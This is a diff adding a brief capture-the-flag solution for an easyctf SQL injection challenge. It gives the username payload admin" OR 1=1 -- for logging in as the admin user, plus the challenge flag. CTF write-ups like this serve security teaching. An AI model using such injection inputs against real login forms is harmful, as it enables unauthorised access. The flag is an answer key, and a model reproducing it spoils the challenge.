@@ -1,0 +1,6 @@
+This is a basic SQL injection, but we need to log in as the admin user, so we can't just do " OR 1=1 --
+
+Instead, we need to change our query to
+Username: admin" OR 1=1 --
+
+easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}
